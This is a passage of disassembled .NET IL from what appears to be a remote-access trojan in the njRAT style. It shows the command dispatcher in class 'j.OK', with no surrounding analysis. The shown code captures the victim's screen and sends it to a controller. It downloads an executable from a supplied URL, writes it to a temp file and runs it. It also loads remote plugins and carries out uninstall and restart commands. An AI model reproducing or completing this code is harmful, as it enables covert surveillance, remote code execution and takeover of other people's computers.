      IL_0441:  stloc.s    V_40
      IL_0443:  ldloc.s    V_40
      IL_0445:  ldc.i4.0
      IL_0446:  ldloc.0
      IL_0447:  ldc.i4.2
      IL_0448:  ldelem.ref
      IL_0449:  stelem.ref
      IL_044a:  ldloc.s    V_40
      IL_044c:  ldnull
      IL_044d:  ldnull
      IL_044e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0453:  ldloc.s    V_10
      IL_0455:  ldnull
      IL_0456:  ldstr      "start"
      IL_045b:  ldc.i4.0
      IL_045c:  newarr     [mscorlib]System.Object
      IL_0461:  ldnull
      IL_0462:  ldnull
      IL_0463:  ldnull
      IL_0464:  ldc.i4.1
      IL_0465:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_046a:  pop
      IL_046b:  br.s       IL_0473

      IL_046d:  ldc.i4.1
      IL_046e:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0473:  ldsfld     bool j.OK::Cn
      IL_0478:  ldc.i4.0
      IL_0479:  ceq
      IL_047b:  box        [mscorlib]System.Boolean
      IL_0480:  ldloc.s    V_10
      IL_0482:  ldnull
      IL_0483:  ldstr      "Off"
      IL_0488:  ldc.i4.0
      IL_0489:  newarr     [mscorlib]System.Object
      IL_048e:  ldnull
      IL_048f:  ldnull
      IL_0490:  ldnull
      IL_0491:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0496:  ldc.i4.1
      IL_0497:  box        [mscorlib]System.Boolean
      IL_049c:  ldc.i4.0
      IL_049d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_04a2:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_04a7:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_04ac:  brfalse.s  IL_046d

      IL_04ae:  ldloc.s    V_10
      IL_04b0:  ldnull
      IL_04b1:  ldstr      "off"
      IL_04b6:  ldc.i4.1
      IL_04b7:  newarr     [mscorlib]System.Object
      IL_04bc:  stloc.s    V_40
      IL_04be:  ldloc.s    V_40
      IL_04c0:  ldc.i4.0
      IL_04c1:  ldc.i4.1
      IL_04c2:  box        [mscorlib]System.Boolean
      IL_04c7:  stelem.ref
      IL_04c8:  ldloc.s    V_40
      IL_04ca:  ldnull
      IL_04cb:  ldnull
      IL_04cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_04d1:  leave      IL_0c53

      IL_04d6:  ldloc.s    V_37
      IL_04d8:  ldstr      "ret"
      IL_04dd:  ldc.i4.0
      IL_04de:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04e3:  ldc.i4.0
      IL_04e4:  bne.un     IL_066b

      IL_04e9:  ldloc.0
      IL_04ea:  ldc.i4.1
      IL_04eb:  ldelem.ref
      IL_04ec:  ldc.i4.0
      IL_04ed:  newarr     [mscorlib]System.Byte
      IL_04f2:  call       object j.OK::GTV(string,
                                                        object)
      IL_04f7:  castclass  uint8[]
      IL_04fc:  stloc.s    V_13
      IL_04fe:  ldloc.0
      IL_04ff:  ldc.i4.2
      IL_0500:  ldelem.ref
      IL_0501:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0506:  ldc.i4.s   10
      IL_0508:  clt
      IL_050a:  ldloc.s    V_13
      IL_050c:  ldlen
      IL_050d:  conv.ovf.i4
      IL_050e:  ldc.i4.0
      IL_050f:  ceq
      IL_0511:  and
      IL_0512:  brfalse.s  IL_055a

      IL_0514:  ldc.i4.5
      IL_0515:  newarr     [mscorlib]System.String
      IL_051a:  stloc.s    V_39
      IL_051c:  ldloc.s    V_39
      IL_051e:  ldc.i4.0
      IL_051f:  ldstr      "pl"
      IL_0524:  stelem.ref
      IL_0525:  ldloc.s    V_39
      IL_0527:  ldc.i4.1
      IL_0528:  ldsfld     string j.OK::Y
      IL_052d:  stelem.ref
      IL_052e:  ldloc.s    V_39
      IL_0530:  ldc.i4.2
      IL_0531:  ldloc.0
      IL_0532:  ldc.i4.1
      IL_0533:  ldelem.ref
      IL_0534:  stelem.ref
      IL_0535:  ldloc.s    V_39
      IL_0537:  ldc.i4.3
      IL_0538:  ldsfld     string j.OK::Y
      IL_053d:  stelem.ref
      IL_053e:  ldloc.s    V_39
      IL_0540:  ldc.i4.4
      IL_0541:  ldc.i4.1
      IL_0542:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0547:  stelem.ref
      IL_0548:  ldloc.s    V_39
      IL_054a:  call       string [mscorlib]System.String::Concat(string[])
      IL_054f:  call       bool j.OK::Send(string)
      IL_0554:  pop
      IL_0555:  leave      IL_0c53

      IL_055a:  ldloc.0
      IL_055b:  ldc.i4.2
      IL_055c:  ldelem.ref
      IL_055d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0562:  ldc.i4.s   10
      IL_0564:  ble.s      IL_05b3

      IL_0566:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_056b:  stloc.s    V_16
      IL_056d:  ldloc.0
      IL_056e:  ldc.i4.0
      IL_056f:  ldelem.ref
      IL_0570:  ldsfld     string j.OK::Y
      IL_0575:  ldloc.0
      IL_0576:  ldc.i4.1
      IL_0577:  ldelem.ref
      IL_0578:  ldsfld     string j.OK::Y
      IL_057d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0582:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0587:  stloc.s    V_15
      IL_0589:  ldloc.s    V_16
      IL_058b:  ldarg.0
      IL_058c:  ldloc.s    V_15
      IL_058e:  ldarg.0
      IL_058f:  ldlen
      IL_0590:  conv.ovf.i4
      IL_0591:  ldloc.s    V_15
      IL_0593:  sub.ovf
      IL_0594:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0599:  ldloc.s    V_16
      IL_059b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_05a0:  call       uint8[] j.OK::ZIP(uint8[])
      IL_05a5:  stloc.s    V_13
      IL_05a7:  ldloc.0
      IL_05a8:  ldc.i4.1
      IL_05a9:  ldelem.ref
      IL_05aa:  ldloc.s    V_13
      IL_05ac:  ldc.i4.3
      IL_05ad:  call       bool j.OK::STV(string,
                                                      object,
                                                      valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_05b2:  pop
      IL_05b3:  ldc.i4.5
      IL_05b4:  newarr     [mscorlib]System.String
      IL_05b9:  stloc.s    V_39
      IL_05bb:  ldloc.s    V_39
      IL_05bd:  ldc.i4.0
      IL_05be:  ldstr      "pl"
      IL_05c3:  stelem.ref
      IL_05c4:  ldloc.s    V_39
      IL_05c6:  ldc.i4.1
      IL_05c7:  ldsfld     string j.OK::Y
      IL_05cc:  stelem.ref
      IL_05cd:  ldloc.s    V_39
      IL_05cf:  ldc.i4.2
      IL_05d0:  ldloc.0
      IL_05d1:  ldc.i4.1
      IL_05d2:  ldelem.ref
      IL_05d3:  stelem.ref
      IL_05d4:  ldloc.s    V_39
      IL_05d6:  ldc.i4.3
      IL_05d7:  ldsfld     string j.OK::Y
      IL_05dc:  stelem.ref
      IL_05dd:  ldloc.s    V_39
      IL_05df:  ldc.i4.4
      IL_05e0:  ldc.i4.0
      IL_05e1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_05e6:  stelem.ref
      IL_05e7:  ldloc.s    V_39
      IL_05e9:  call       string [mscorlib]System.String::Concat(string[])
      IL_05ee:  call       bool j.OK::Send(string)
      IL_05f3:  pop
      IL_05f4:  ldloc.s    V_13
      IL_05f6:  ldstr      "A"
      IL_05fb:  call       object j.OK::Plugin(uint8[],
                                                           string)
      IL_0600:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0605:  stloc.s    V_14
      IL_0607:  ldc.i4.5
      IL_0608:  newarr     [mscorlib]System.String
      IL_060d:  stloc.s    V_39
      IL_060f:  ldloc.s    V_39
      IL_0611:  ldc.i4.0
      IL_0612:  ldstr      "ret"
      IL_0617:  stelem.ref
      IL_0618:  ldloc.s    V_39
      IL_061a:  ldc.i4.1
      IL_061b:  ldsfld     string j.OK::Y
      IL_0620:  stelem.ref
      IL_0621:  ldloc.s    V_39
      IL_0623:  ldc.i4.2
      IL_0624:  ldloc.0
      IL_0625:  ldc.i4.1
      IL_0626:  ldelem.ref
      IL_0627:  stelem.ref
      IL_0628:  ldloc.s    V_39
      IL_062a:  ldc.i4.3
      IL_062b:  ldsfld     string j.OK::Y
      IL_0630:  stelem.ref
      IL_0631:  ldloc.s    V_39
      IL_0633:  ldc.i4.4
      IL_0634:  ldloc.s    V_14
      IL_0636:  ldnull
      IL_0637:  ldstr      "GT"
      IL_063c:  ldc.i4.0
      IL_063d:  newarr     [mscorlib]System.Object
      IL_0642:  ldnull
      IL_0643:  ldnull
      IL_0644:  ldnull
      IL_0645:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_064a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_064f:  stloc.s    V_41
      IL_0651:  ldloca.s   V_41
      IL_0653:  call       string j.OK::ENB(string&)
      IL_0658:  stelem.ref
      IL_0659:  ldloc.s    V_39
      IL_065b:  call       string [mscorlib]System.String::Concat(string[])
      IL_0660:  call       bool j.OK::Send(string)
      IL_0665:  pop
      IL_0666:  leave      IL_0c53

      IL_066b:  ldloc.s    V_37
      IL_066d:  ldstr      "CAP"
      IL_0672:  ldc.i4.0
      IL_0673:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0678:  ldc.i4.0
      IL_0679:  bne.un     IL_0815

      IL_067e:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0683:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0688:  stloc.s    V_47
      IL_068a:  ldloca.s   V_47
      IL_068c:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0691:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0696:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_069b:  stloc.s    V_48
      IL_069d:  ldloca.s   V_48
      IL_069f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_06a4:  ldc.i4     0x21005
      IL_06a9:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_06ae:  stloc.s    V_21
      IL_06b0:  ldloc.s    V_21
      IL_06b2:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_06b7:  stloc.s    V_17
      IL_06b9:  ldloc.s    V_17
      IL_06bb:  ldc.i4.0
      IL_06bc:  ldc.i4.0
      IL_06bd:  ldc.i4.0
      IL_06be:  ldc.i4.0
      IL_06bf:  ldloca.s   V_49
      IL_06c1:  ldloc.s    V_21
      IL_06c3:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_06c8:  ldloc.s    V_21
      IL_06ca:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_06cf:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_06d4:  ldloc.s    V_49
      IL_06d6:  ldc.i4     0xcc0020
      IL_06db:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_06e0:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_06e5:  ldloc.s    V_17
        IL_06e7:  ldloca.s   V_48
        IL_06e9:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_06ee:  ldloca.s   V_49
        IL_06f0:  ldc.i4.s   32
        IL_06f2:  ldc.i4.s   32
        IL_06f4:  call       instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_06f9:  ldloc.s    V_49
        IL_06fb:  call       instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_0700:  ldloc.s    V_48
        IL_0702:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_0707:  leave.s    IL_0718

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0709:  dup
        IL_070a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_070f:  stloc.s    V_23
        IL_0711:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0716:  leave.s    IL_0718

      }  // end handler
      IL_0718:  ldloc.s    V_17
      IL_071a:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_071f:  ldloc.0
      IL_0720:  ldc.i4.1
      IL_0721:  ldelem.ref
      IL_0722:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0727:  ldloc.0
      IL_0728:  ldc.i4.2
      IL_0729:  ldelem.ref
      IL_072a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_072f:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_0734:  stloc.s    V_22
      IL_0736:  ldloc.s    V_22
      IL_0738:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_073d:  stloc.s    V_17
      IL_073f:  ldloc.s    V_17
      IL_0741:  ldloc.s    V_21
      IL_0743:  ldc.i4.0
      IL_0744:  ldc.i4.0
      IL_0745:  ldloc.s    V_22
      IL_0747:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_074c:  ldloc.s    V_22
      IL_074e:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0753:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_0758:  ldloc.s    V_17
      IL_075a:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_075f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0764:  stloc.s    V_19
      IL_0766:  ldstr      "CAP"
      IL_076b:  ldsfld     string j.OK::Y
      IL_0770:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0775:  stloc.s    V_41
      IL_0777:  ldloca.s   V_41
      IL_0779:  call       uint8[] j.OK::SB(string&)
      IL_077e:  starg.s    b
      IL_0780:  ldloc.s    V_19
      IL_0782:  ldarg.0
      IL_0783:  ldc.i4.0
      IL_0784:  ldarg.0
      IL_0785:  ldlen
      IL_0786:  conv.ovf.i4
      IL_0787:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_078c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0791:  stloc.s    V_20
      IL_0793:  ldloc.s    V_22
      IL_0795:  ldloc.s    V_20
      IL_0797:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_079c:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_07a1:  ldloc.s    V_20
      IL_07a3:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07a8:  call       string j.OK::md5(uint8[])
      IL_07ad:  stloc.s    V_18
      IL_07af:  ldloc.s    V_18
      IL_07b1:  ldsfld     string j.OK::lastcap
      IL_07b6:  ldc.i4.0
      IL_07b7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07bc:  ldc.i4.0
      IL_07bd:  beq.s      IL_07df

      IL_07bf:  ldloc.s    V_18
      IL_07c1:  stsfld     string j.OK::lastcap
      IL_07c6:  ldloc.s    V_19
      IL_07c8:  ldloc.s    V_20
      IL_07ca:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07cf:  ldc.i4.0
      IL_07d0:  ldloc.s    V_20
      IL_07d2:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_07d7:  conv.ovf.i4
      IL_07d8:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_07dd:  br.s       IL_07e7

      IL_07df:  ldloc.s    V_19
      IL_07e1:  ldc.i4.0
      IL_07e2:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_07e7:  ldloc.s    V_19
      IL_07e9:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_07ee:  call       bool j.OK::Sendb(uint8[])
      IL_07f3:  pop
      IL_07f4:  ldloc.s    V_19
      IL_07f6:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_07fb:  ldloc.s    V_20
      IL_07fd:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_0802:  ldloc.s    V_21
      IL_0804:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0809:  ldloc.s    V_22
      IL_080b:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_0810:  leave      IL_0c53

      IL_0815:  ldloc.s    V_37
      IL_0817:  ldstr      "un"
      IL_081c:  ldc.i4.0
      IL_081d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0822:  ldc.i4.0
      IL_0823:  bne.un.s   IL_0897

      IL_0825:  ldloc.0
      IL_0826:  ldc.i4.1
      IL_0827:  ldelem.ref
      IL_0828:  stloc.s    V_50
      IL_082a:  ldloc.s    V_50
      IL_082c:  ldstr      "~"
      IL_0831:  ldc.i4.0
      IL_0832:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0837:  ldc.i4.0
      IL_0838:  bne.un.s   IL_0844

      IL_083a:  call       void j.OK::UNS()
      IL_083f:  leave      IL_0c53

      IL_0844:  ldloc.s    V_50
      IL_0846:  ldstr      "!"
      IL_084b:  ldc.i4.0
      IL_084c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0851:  ldc.i4.0
      IL_0852:  bne.un.s   IL_0864

      IL_0854:  ldc.i4.0
      IL_0855:  call       void j.OK::pr(int32)
      IL_085a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_085f:  leave      IL_0c53

      IL_0864:  ldloc.s    V_50
      IL_0866:  ldstr      "@"
      IL_086b:  ldc.i4.0
      IL_086c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0871:  ldc.i4.0
      IL_0872:  bne.un     IL_0bbb

      IL_0877:  ldc.i4.0
      IL_0878:  call       void j.OK::pr(int32)
      IL_087d:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0882:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_0887:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_088c:  pop
      IL_088d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0892:  leave      IL_0c53

      IL_0897:  ldloc.s    V_37
      IL_0899:  ldstr      "up"
      IL_089e:  ldc.i4.0
      IL_089f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08a4:  ldc.i4.0
      IL_08a5:  bne.un     IL_0a1c

      IL_08aa:  ldnull
      IL_08ab:  stloc.s    V_24
      IL_08ad:  ldloc.0
      IL_08ae:  ldc.i4.1
      IL_08af:  ldelem.ref
      IL_08b0:  ldc.i4.0
      IL_08b1:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_08b6:  ldc.i4.s   31
      IL_08b8:  bne.un.s   IL_092f

      .try
      {
        IL_08ba:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_08bf:  stloc.s    V_27
        IL_08c1:  ldloc.0
        IL_08c2:  ldc.i4.0
        IL_08c3:  ldelem.ref
        IL_08c4:  ldsfld     string j.OK::Y
        IL_08c9:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_08ce:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_08d3:  stloc.s    V_26
        IL_08d5:  ldloc.s    V_27
        IL_08d7:  ldarg.0
        IL_08d8:  ldloc.s    V_26
        IL_08da:  ldarg.0
        IL_08db:  ldlen
        IL_08dc:  conv.ovf.i4
        IL_08dd:  ldloc.s    V_26
        IL_08df:  sub.ovf
        IL_08e0:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_08e5:  ldloc.s    V_27
        IL_08e7:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_08ec:  call       uint8[] j.OK::ZIP(uint8[])
        IL_08f1:  stloc.s    V_24
        IL_08f3:  leave      IL_097b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_08f8:  dup
        IL_08f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_08fe:  stloc.s    V_28
        IL_0900:  ldstr      "MSG"
        IL_0905:  ldsfld     string j.OK::Y
        IL_090a:  ldstr      "Update ERROR"
        IL_090f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0914:  call       bool j.OK::Send(string)
        IL_0919:  pop
        IL_091a:  ldstr      "bla"
        IL_091f:  call       bool j.OK::Send(string)
        IL_0924:  pop
        IL_0925:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_092a:  leave      IL_0c53

      }  // end handler
      IL_092f:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0934:  stloc.s    V_29
      .try
      {
        IL_0936:  ldloc.s    V_29
        IL_0938:  ldloc.0
        IL_0939:  ldc.i4.1
        IL_093a:  ldelem.ref
        IL_093b:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0940:  stloc.s    V_24
        IL_0942:  leave.s    IL_097b

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0944:  dup
        IL_0945:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_094a:  stloc.s    V_30
        IL_094c:  ldstr      "MSG"
        IL_0951:  ldsfld     string j.OK::Y
        IL_0956:  ldstr      "Update ERROR"
        IL_095b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0960:  call       bool j.OK::Send(string)
        IL_0965:  pop
        IL_0966:  ldstr      "bla"
        IL_096b:  call       bool j.OK::Send(string)
        IL_0970:  pop
        IL_0971:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0976:  leave      IL_0c53

      }  // end handler
      IL_097b:  ldstr      "bla"
      IL_0980:  call       bool j.OK::Send(string)
      IL_0985:  pop
      IL_0986:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_098b:  ldstr      ".exe"
      IL_0990:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0995:  stloc.s    V_25
      .try
      {
        IL_0997:  ldstr      "MSG"
        IL_099c:  ldsfld     string j.OK::Y
        IL_09a1:  ldstr      "Updating To "
        IL_09a6:  ldloc.s    V_25
        IL_09a8:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_09ad:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_09b2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_09b7:  call       bool j.OK::Send(string)
        IL_09bc:  pop
        IL_09bd:  ldc.i4     0x7d0
        IL_09c2:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_09c7:  ldloc.s    V_25
        IL_09c9:  ldloc.s    V_24
        IL_09cb:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_09d0:  ldloc.s    V_25
        IL_09d2:  ldstr      ".."
        IL_09d7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_09dc:  pop
        IL_09dd:  leave.s    IL_0a12

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_09df:  dup
        IL_09e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09e5:  stloc.s    V_31
        IL_09e7:  ldstr      "MSG"
        IL_09ec:  ldsfld     string j.OK::Y
        IL_09f1:  ldstr      "Update ERROR "
        IL_09f6:  ldloc.s    V_31
        IL_09f8:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_09fd:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0a02:  call       bool j.OK::Send(string)
        IL_0a07:  pop
        IL_0a08:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a0d:  leave      IL_0c53

      }  // end handler
      IL_0a12:  call       void j.OK::UNS()
      IL_0a17:  leave      IL_0c53

      IL_0a1c:  ldloc.s    V_37
      IL_0a1e:  ldstr      "Ex"
      IL_0a23:  ldc.i4.0
      IL_0a24:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a29:  ldc.i4.0
      IL_0a2a:  bne.un     IL_0aee

      IL_0a2f:  ldsfld     object j.OK::PLG
      IL_0a34:  brtrue.s   IL_0a8b

      IL_0a36:  ldstr      "PLG"
      IL_0a3b:  call       bool j.OK::Send(string)
      IL_0a40:  pop
      IL_0a41:  ldc.i4.0
      IL_0a42:  stloc.s    V_32
      IL_0a44:  br.s       IL_0a56

      IL_0a46:  ldloc.s    V_32
      IL_0a48:  ldc.i4.1
      IL_0a49:  add.ovf
      IL_0a4a:  stloc.s    V_32
      IL_0a4c:  ldc.i4     0x3e8
      IL_0a51:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0a56:  ldsfld     object j.OK::PLG
      IL_0a5b:  ldnull
      IL_0a5c:  ceq
